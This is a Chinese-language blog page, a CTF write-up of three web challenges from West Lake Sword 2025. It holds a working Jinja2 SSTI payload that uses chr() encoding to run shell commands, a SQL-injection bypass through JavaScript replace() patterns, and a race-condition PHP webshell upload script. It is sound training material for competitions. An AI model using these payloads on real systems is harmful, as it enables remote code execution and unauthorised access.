@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=5"
+    />
+    <meta name="description" content="Rank-I | SV 唯一做出来一道55   起来黑盒，有点懵逼 dirsearch开扫，发现&#x2F;console，查看响应包，发现js代码执行(xss)，however没用啊 xss并无法302，在浏览器执行后相当于输入url，重定向没有用 此处没有别的用户，xss没有作用   马萨卡要http头注入来访问&#x2F;console？但是没有多余信息，ctf中没有见过 这种可以报错看看，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="西湖论剑2025">
+<meta property="og:url" content="https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/index.html">
+<meta property="og:site_name" content="KC1zs4&#39;s Blog">
+<meta property="og:description" content="Rank-I | SV 唯一做出来一道55   起来黑盒，有点懵逼 dirsearch开扫，发现&#x2F;console，查看响应包，发现js代码执行(xss)，however没用啊 xss并无法302，在浏览器执行后相当于输入url，重定向没有用 此处没有别的用户，xss没有作用   马萨卡要http头注入来访问&#x2F;console？但是没有多余信息，ctf中没有见过 这种可以报错看看，">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://kc1zs4.github.io/pic/25%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/rank_i_bl.png">
+<meta property="article:published_time" content="2025-01-20T07:15:20.068Z">
+<meta property="article:modified_time" content="2025-01-21T12:04:33.368Z">
+<meta property="article:tag" content="recurrence">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kc1zs4.github.io/pic/25%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/rank_i_bl.png">    
+    <link
+        rel="shortcut icon"
+        href="/images/favicon.ico"
+    />
+       
+    <link
+        rel="icon"
+        type="image/png"
+        href="/images/favicon-192x192.png"
+        sizes="192x192"
+    />
+       
+    <link
+        rel="apple-touch-icon"
+        sizes="180x180"
+        href="/images/apple-touch-icon.png"
+    />
+      
+    <!-- title -->
+    <title>西湖论剑2025</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Z6JGRC9FT2"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-Z6JGRC9FT2');
+  </script>
+
+ <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+     
+    <!-- mathjax -->
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/20/24DasctX0x401/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/12/17/JavaWeb5_SpringCloud/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/&text=西湖论剑2025"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/&title=西湖论剑2025"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/&is_video=false&description=西湖论剑2025"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=西湖论剑2025&body=Check out this article: https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/&title=西湖论剑2025"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/&title=西湖论剑2025"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/&title=西湖论剑2025"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/&title=西湖论剑2025"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/&name=西湖论剑2025&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/&t=西湖论剑2025"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Rank-I-SV"><span class="toc-number">1.</span> <span class="toc-text">Rank-I | SV</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-or-not-%E5%A4%8D%E4%B9%A0"><span class="toc-number">2.</span> <span class="toc-text">sqli or not | 复习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rank-U-%E5%A4%8D%E4%B9%A0"><span class="toc-number">3.</span> <span class="toc-text">Rank-U | 复习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">4.</span> <span class="toc-text">Summary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rank-I"><span class="toc-number">4.1.</span> <span class="toc-text">Rank-I</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqli-or-not"><span class="toc-number">4.2.</span> <span class="toc-text">sqli or not</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rank-U"><span class="toc-number">4.3.</span> <span class="toc-text">Rank-U</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">5.</span> <span class="toc-text">Ref</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        西湖论剑2025
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-20T07:15:20.068Z" class="dt-published" itemprop="datePublished">2025-01-20</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/recurrence/" rel="tag">recurrence</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Rank-I-SV"><a href="#Rank-I-SV" class="headerlink" title="Rank-I | SV"></a>Rank-I | SV</h2><blockquote>
+<p>唯一做出来一道55</p>
+</blockquote>
+<ol>
+<li>起来黑盒，有点懵逼</li>
+<li>dirsearch开扫，发现&#x2F;console，查看响应包，发现js代码执行(xss)，however没用啊<ol>
+<li>xss并无法302，在浏览器执行后相当于输入url，重定向没有用</li>
+<li>此处没有别的用户，xss没有作用</li>
+</ol>
+</li>
+<li>马萨卡要http头注入来访问&#x2F;console？但是没有多余信息，ctf中没有见过</li>
+<li>这种可以报错看看，&#x2F;login和&#x2F;cpass的post请求置空，发现熟悉的flask报错<ol>
+<li>有phone&#x3D;1686682318，password&#x3D;Happy_news_admin，但是没有用bro</li>
+<li>user_input有黑名单，这里phone的黑名单，干啥勒<ol>
+<li><img src="/pic/25%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/rank_i_bl.png" alt="pic"></li>
+<li>直接执行命令，可以试试ssti这里是</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>14，ok，是模板注入，绕过只需要绕过/即可了，首先想到编码+拼接，ascii可以
+
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;http://139.155.126.78:26575&quot;</span></span><br><span class="line">path_root=<span class="string">&quot;/&quot;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://localhost:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment">### 登录</span></span><br><span class="line">path_login=<span class="string">&quot;/login&quot;</span></span><br><span class="line">login_data = &#123;</span><br><span class="line">    <span class="string">&quot;phone_number&quot;</span>: <span class="string">&quot;&#123;%set chr=g.pop.__globals__[&#x27;__builtins__&#x27;].chr%&#125;&#123;&#123;g.pop.__globals__.__builtins__[&#x27;__import_&#x27;+&#x27;_&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).popen(chr(110)+chr(108)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(102)+chr(49)+chr(52)+chr(57)).read()&#125;&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = session.post(host+path_login,data=login_data,proxies=proxies, timeout=<span class="number">5</span>)</span><br><span class="line">path_cpass=<span class="string">&quot;/cpass&quot;</span></span><br><span class="line">cpass_data = &#123;</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = session.post(host+path_cpass,data=cpass_data,proxies=proxies, timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># helper.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_chr_expression</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="comment"># 使用列表推导式和ord()函数来获取每个字符的ASCII值</span></span><br><span class="line">    <span class="comment"># 然后构建所需的字符串格式</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;+&#x27;</span>.join(<span class="string">f&#x27;chr(<span class="subst">&#123;<span class="built_in">ord</span>(char)&#125;</span>)&#x27;</span> <span class="keyword">for</span> char <span class="keyword">in</span> input_string)</span><br><span class="line">input_str=<span class="string">&quot;nl /flagf149&quot;</span></span><br><span class="line">result = string_to_chr_expression(input_str)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="sqli-or-not-复习"><a href="#sqli-or-not-复习" class="headerlink" title="sqli or not | 复习"></a>sqli or not | 复习</h2><ol>
+<li>代码审计，绕过逗号直接用url即可</li>
+<li>把’”\都给过滤了要来注入应该是不行了，不支持宽字节这里(宽字节也是用于转义的，这里不符合)</li>
+<li>结合题眼描述，从node.js切入，绕过’<ol>
+<li><p>在json.parse()处，这里没有（可以绕过,来着），在这里就开摆了，下次不敢了</p>
+</li>
+<li><p>在replace()，<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace#%E6%8C%87%E5%AE%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%9C%E4%B8%BA%E6%9B%BF%E6%8D%A2%E9%A1%B9">绕过</a></p>
+<ol>
+<li>这里还是要细心下来的wc，就算看到了可能也想不到啊</li>
+<li>本地起一个看看嘻嘻</li>
+</ol>
+  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// npm install express</span></span><br><span class="line"><span class="comment">// node test.js</span></span><br><span class="line"><span class="comment">// test.js</span></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Express应用程序实例</span></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义路由</span></span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">info</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/\,/gi</span>)) &#123;</span><br><span class="line">            res.<span class="title function_">end</span>(<span class="string">&quot;hacker1!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> info = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">info</span>); <span class="comment">// 注意：这里存在原型污染风险</span></span><br><span class="line">        <span class="keyword">if</span> (info.<span class="property">username</span> &amp;&amp; info.<span class="property">password</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> username = info.<span class="property">username</span>;</span><br><span class="line">            <span class="keyword">var</span> password = info.<span class="property">password</span>;</span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                info.<span class="property">username</span>.<span class="title function_">match</span>(<span class="regexp">/\&#x27;|\&quot;|\\/</span>) ||</span><br><span class="line">                info.<span class="property">password</span>.<span class="title function_">match</span>(<span class="regexp">/\&#x27;|\&quot;|\\/</span>)</span><br><span class="line">            ) &#123;</span><br><span class="line">                res.<span class="title function_">end</span>(<span class="string">&quot;hacker2!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> sql =</span><br><span class="line">                <span class="string">&quot;select * from userinfo where username = &#x27;&#123;username&#125;&#x27; and password = &#x27;&#123;password&#125;&#x27;&quot;</span>;</span><br><span class="line">            sql = sql.<span class="title function_">replace</span>(<span class="string">&quot;&#123;username&#125;&quot;</span>, username);</span><br><span class="line">            sql = sql.<span class="title function_">replace</span>(<span class="string">&quot;&#123;password&#125;&quot;</span>, password);</span><br><span class="line">            res.<span class="title function_">end</span>(sql);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">end</span>(<span class="string">&quot;please input the data&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&quot;please input the data&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用路由器</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/&quot;</span>, router);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听8081端口</span></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8081</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Server is running on port 8081&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;http://localhost:8081&quot;</span></span><br><span class="line">path_root=<span class="string">&quot;/&quot;</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment">### 1. 发送username和password</span></span><br><span class="line">inject_params=&#123;</span><br><span class="line">    <span class="comment"># json格式输入</span></span><br><span class="line">    <span class="comment"># &quot;info&quot;: &#x27;&#123;&quot;username&quot;:&quot;abc&quot;,&quot;password&quot;:&quot;admin&quot;&#125;&#x27;</span></span><br><span class="line">    <span class="string">&quot;info&quot;</span>: <span class="string">&#x27;&#123;&quot;username&quot;:&quot;$` or 1=1 --&quot;,&quot;password&quot;:&quot;admin&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">r = session.get(host+path_root,params=inject_params,timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出，成功绕过</span></span><br><span class="line"><span class="comment"># select * from userinfo where username = &#x27;select * from userinfo where username = &#x27; or 1=1 --&#x27; and password = &#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<h2 id="Rank-U-复习"><a href="#Rank-U-复习" class="headerlink" title="Rank-U | 复习"></a>Rank-U | 复习</h2><ol>
+<li><p>看wp是随意登录？bp随便爆</p>
+</li>
+<li><p>上传文件无法访问，很正常的竞争思路，早知道看这题了呜呜呜，学习一下川大脚本</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># upload.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://xxx/admin/index.php&quot;</span>  <span class="comment"># 更新 URL</span></span><br><span class="line">    cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;bsgq3v7goubrk1ciepr0se2dfc&quot;</span>&#125;  <span class="comment"># 更新 PHP 会话 ID</span></span><br><span class="line">    </span><br><span class="line">    data = (</span><br><span class="line">        <span class="string">&quot;------WebKitFormBoundarygIbPTT5pJVbv72RS\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Content-Disposition: form-data; name=\&quot;file_upload\&quot;; filename=\&quot;yjh3.php\&quot;\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Content-Type: application/octet-stream\r\n\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;&lt;?php echo file_get_contents(&#x27;/flag&#x27;);?&gt;\r\n&quot;</span>  <span class="comment"># 改为新代码</span></span><br><span class="line">        <span class="string">&quot;------WebKitFormBoundarygIbPTT5pJVbv72RS--\r\n&quot;</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送 POST 请求，只保留 Cookie</span></span><br><span class="line">    r = requests.post(url, cookies=cookies, data=data)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取文件名并保存到本地文件</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        filename = r.text.split(<span class="string">&#x27;./Uploads/1f14bba00da3b75118bc8dbf8625f7d0/&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&lt;/p&gt;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;name.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(filename.strip())  <span class="comment"># 使用 strip() 去除可能的换行符</span></span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无法提取文件路径或文件上传失败&quot;</span>)   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># access.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url0 = <span class="string">&#x27;http://xxx/admin/Uploads/1f14bba00da3b75118bc8dbf8625f7d0/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 直接读取文件内容，去除换行符并逐行处理</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;name.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> file:</span><br><span class="line">            shellpath = url0 + filename.strip()  <span class="comment"># 使用 strip() 去除换行符</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 发起 GET 请求</span></span><br><span class="line">            r1 = requests.get(shellpath)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 如果状态码不是 404，输出状态码和响应文本</span></span><br><span class="line">            <span class="keyword">if</span> r1.status_code != <span class="number">404</span>:</span><br><span class="line">                <span class="built_in">print</span>(r1.status_code)</span><br><span class="line">                <span class="built_in">print</span>(r1.text)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><h3 id="Rank-I"><a href="#Rank-I" class="headerlink" title="Rank-I"></a>Rank-I</h3><blockquote>
+<p>其实是很简单的ssti题目</p>
+</blockquote>
+<ul>
+<li><input disabled="" type="checkbox"> fenjing</li>
+<li><input disabled="" type="checkbox"> sh, curl, wget getshell</li>
+<li><input disabled="" type="checkbox"> ssti</li>
+</ul>
+<ol>
+<li>找到方向最重要<ol>
+<li>fuzz测试：输入可能有ssti，xss这些</li>
+<li>获取信息：dirsearch，报错信息，http返回头信息</li>
+<li>方向尝试：题眼，假设评级(比如这里一开始xss想要重定向，应该想到没用的)</li>
+</ol>
+</li>
+<li>黑名单绕过<ol>
+<li>明确目的：这里其实已经确定了&#x2F;，编码+拼接了，因为chr没有跑去反弹了，但是也不行，虽然可以通外网，这里顺下去引入chr就好了</li>
+</ol>
+</li>
+</ol>
+<h3 id="sqli-or-not"><a href="#sqli-or-not" class="headerlink" title="sqli or not"></a>sqli or not</h3><blockquote>
+<p>逻辑不难，差一点点，不过方向对了，说明还没废掉</p>
+</blockquote>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> node cheat sheet</li>
+</ul>
+<ol>
+<li>查找特殊字符<ol>
+<li>也可以是拼接，先想象一下在跳过</li>
+</ol>
+</li>
+<li>查找资料<ol>
+<li>现有方向最重要</li>
+<li>wp+论坛 -&gt; 没找到(把握下没找到的度)再官方文档</li>
+</ol>
+</li>
+</ol>
+<h3 id="Rank-U"><a href="#Rank-U" class="headerlink" title="Rank-U"></a>Rank-U</h3><blockquote>
+<p>完全没看(，看了wp感觉无话可说</p>
+</blockquote>
+<ul>
+<li><input disabled="" type="checkbox"> php文件竞争上传</li>
+</ul>
+<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/uuzeray/article/details/145228235">川大爷是真的nb</a></li>
+<li><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/3646467.html">ssti不错</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.xmcve.com/2025/01/19/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2025-Writeup/">清晰的一匹</a></li>
+</ol>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
